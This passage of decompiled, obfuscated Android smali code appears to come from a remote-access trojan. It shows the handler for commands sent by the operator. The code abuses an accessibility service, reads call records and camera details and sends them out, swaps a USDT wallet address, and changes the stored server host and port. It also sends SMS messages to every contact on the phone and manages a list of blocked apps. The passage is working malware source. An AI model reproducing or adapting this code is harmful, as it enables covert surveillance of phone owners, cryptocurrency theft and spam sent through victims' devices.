
    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->NeedPaste:Ljava/lang/Boolean;

    .line 411
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v5, "Paste"

    const/4 v6, 0x0

    invoke-virtual {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Treger(Ljava/lang/String;[Ljava/lang/String;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_11 .. :try_end_11} :catch_15

    goto/16 :goto_2a

    .line 418
    :cond_13
    :try_start_12
    aget-object v5, v10, v8

    const-string v9, "GRC<*>"

    invoke-virtual {v5, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_12 .. :try_end_12} :catch_15

    if-eqz v5, :cond_14

    .line 422
    :try_start_13
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->Get_Records:Ljava/lang/String;

    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Getrecordsnames()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_13 .. :try_end_13} :catch_15

    goto/16 :goto_2a

    .line 428
    :cond_14
    :try_start_14
    aget-object v5, v10, v8

    const-string v9, "rmiui<*>"

    invoke-virtual {v5, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_15

    goto/16 :goto_2a

    .line 519
    :cond_15
    aget-object v5, v10, v8

    const-string v9, "pslock<*>"

    invoke-virtual {v5, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_14 .. :try_end_14} :catch_15

    if-eqz v5, :cond_17

    .line 521
    :try_start_15
    aget-object v0, v10, v8

    const-string v5, "pslock<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 522
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v5, :cond_af

    const-string v5, "allow"

    .line 523
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_16

    .line 525
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v5, "bassit"

    const/4 v6, 0x0

    invoke-virtual {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Treger(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_2a

    .line 528
    :cond_16
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v5, "unbassit"

    const/4 v6, 0x0

    invoke-virtual {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Treger(Ljava/lang/String;[Ljava/lang/String;)V
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_15 .. :try_end_15} :catch_15

    goto/16 :goto_2a

    .line 536
    :cond_17
    :try_start_16
    aget-object v5, v10, v8

    const-string v9, "gtrc<*>"

    invoke-virtual {v5, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_16 .. :try_end_16} :catch_15

    const-string v9, "#"

    if-eqz v5, :cond_18

    .line 538
    :try_start_17
    aget-object v0, v10, v8

    const-string v5, "gtrc<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 539
    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 541
    aget-object v5, v0, v3

    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->GetThisRec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 543
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    if-lez v6, :cond_af

    .line 545
    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->GetRecord:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v9, v0, v3

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "*"

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "*"

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v0, v0, v8

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v6, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_17 .. :try_end_17} :catch_15

    goto/16 :goto_2a

    .line 552
    :cond_18
    :try_start_18
    aget-object v5, v10, v8

    const-string v6, "lcm<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_18 .. :try_end_18} :catch_15

    if-eqz v5, :cond_1a

    .line 554
    :try_start_19
    aget-object v0, v10, v8

    const-string v5, "lcm<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 555
    invoke-static {v3}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v5

    .line 556
    invoke-virtual {v5}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v5

    invoke-virtual {v5}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v5

    .line 558
    new-instance v6, Ljava/util/Vector;

    invoke-direct {v6}, Ljava/util/Vector;-><init>()V

    .line 560
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v6, 0x0

    .line 561
    :goto_5
    invoke-interface {v5}, Ljava/util/List;->size()I

    move-result v7

    if-ge v6, v7, :cond_19

    .line 563
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "["

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v5, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/hardware/Camera$Size;

    iget v8, v8, Landroid/hardware/Camera$Size;->width:I

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "x"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v5, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/hardware/Camera$Size;

    iget v8, v8, Landroid/hardware/Camera$Size;->height:I

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "],"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 565
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    add-int/lit8 v6, v6, 0x1

    goto :goto_5

    .line 568
    :cond_19
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->LoadCaminfo:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_19 .. :try_end_19} :catch_15

    goto/16 :goto_2a

    .line 574
    :cond_1a
    :try_start_1a
    aget-object v5, v10, v8

    const-string v6, "usdtress<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1a .. :try_end_1a} :catch_15

    if-eqz v5, :cond_1b

    .line 576
    :try_start_1b
    aget-object v0, v10, v8

    const-string v5, "usdtress<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->usdtadress:Ljava/lang/String;
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1b .. :try_end_1b} :catch_15

    goto/16 :goto_2a

    .line 580
    :cond_1b
    :try_start_1c
    aget-object v5, v10, v8

    const-string v6, "lnk<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1c .. :try_end_1c} :catch_15

    if-eqz v5, :cond_1c

    .line 582
    :try_start_1d
    aget-object v0, v10, v8

    const-string v5, "lnk<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->openlink(Ljava/lang/String;)V
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1d .. :try_end_1d} :catch_15

    goto/16 :goto_2a

    .line 590
    :cond_1c
    :try_start_1e
    aget-object v5, v10, v8

    const-string v6, "EHP<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1e .. :try_end_1e} :catch_15

    if-eqz v5, :cond_1d

    .line 593
    :try_start_1f
    aget-object v5, v10, v8

    const-string v6, "EHP<*>"

    invoke-virtual {v5, v6, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    .line 594
    invoke-virtual {v5, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    .line 595
    aget-object v6, v5, v3

    .line 596
    aget-object v8, v5, v8

    .line 597
    aget-object v5, v5, v7

    .line 598
    sput-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->CLINAME:Ljava/lang/String;

    .line 599
    aget-object v7, p1, v3

    const-string v9, "NH"

    invoke-static {v7, v9, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 600
    aget-object v6, p1, v3

    const-string v7, "NP"

    invoke-static {v6, v7, v8}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 601
    aget-object v6, p1, v3

    const-string v7, "NN"

    invoke-static {v6, v7, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 602
    aget-object v5, p1, v3

    const-string v6, "UP"

    const-string v7, "YES"

    invoke-static {v5, v6, v7}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 604
    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->CLOSEALLINTENT(Ljava/lang/String;)V

    .line 605
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/SecondActivity;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 606
    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 607
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 609
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/Runtime;->exit(I)V
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1f .. :try_end_1f} :catch_15

    goto/16 :goto_2c

    :catch_3
    move-exception v0

    .line 615
    :try_start_20
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_2a

    .line 619
    :cond_1d
    aget-object v5, v10, v8

    const-string v6, "ssms<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_20 .. :try_end_20} :catch_15

    if-eqz v5, :cond_24

    .line 625
    :try_start_21
    aget-object v0, v10, v8

    const-string v5, "ssms<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "all<>"

    .line 626
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_23

    .line 628
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x17

    if-lt v5, v6, :cond_20

    .line 629
    aget-object v5, p1, v3

    const-string v6, "android.permission.READ_CONTACTS"

    invoke-virtual {v5, v6}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_af

    const-string v5, "all<>"

    .line 630
    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 632
    aget-object v0, v0, v3

    .line 634
    aget-object v5, p1, v3

    invoke-virtual {v5}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    sget-object v7, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v5

    .line 635
    :cond_1e
    :goto_6
    invoke-interface {v5}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-eqz v6, :cond_1f

    const-string v6, "data1"

    .line 636
    invoke-interface {v5, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    const/4 v7, -0x1

    if-le v6, v7, :cond_1e

    .line 638
    invoke-interface {v5, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 639
    invoke-static {v6, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_6

    .line 642
    :cond_1f
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    goto/16 :goto_2a

    :cond_20
    const-string v5, "all<>"

    .line 645
    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 647
    aget-object v0, v0, v3

    .line 649
    aget-object v5, p1, v3

    invoke-virtual {v5}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    sget-object v7, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v5

    .line 650
    :cond_21
    :goto_7
    invoke-interface {v5}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-eqz v6, :cond_22

    const-string v6, "data1"

    .line 651
    invoke-interface {v5, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    const/4 v7, -0x1

    if-le v6, v7, :cond_21

    .line 653
    invoke-interface {v5, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 654
    invoke-static {v6, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_7

    .line 658
    :cond_22
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    goto/16 :goto_2a

    .line 664
    :cond_23
    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 665
    aget-object v5, v0, v3

    .line 666
    aget-object v0, v0, v8

    .line 667
    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_21 .. :try_end_21} :catch_15

    goto/16 :goto_2a

    .line 675
    :cond_24
    :try_start_22
    aget-object v5, v10, v8

    const-string v6, "CRD<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_22 .. :try_end_22} :catch_15

    if-eqz v5, :cond_26

    .line 677
    :try_start_23
    aget-object v0, v10, v8

    const-string v5, "CRD<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "E>"

    .line 678
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_25

    .line 679
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->DisabledApps:Ljava/util/List;

    const-string v6, "E>"

    invoke-virtual {v0, v6, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v5, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto/16 :goto_2a

    :cond_25
    const-string v5, "D>"

    .line 680
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_af

    .line 681
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->DisabledApps:Ljava/util/List;

    const-string v6, "D>"

    invoke-virtual {v0, v6, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v5, v0}, Ljava/util/List;->remove(Ljava/lang/Object;)Z
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_23 .. :try_end_23} :catch_15

    goto/16 :goto_2a

    .line 685
    :cond_26
    :try_start_24
    aget-object v5, v10, v8

    const-string v6, "SFD<*>"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2e

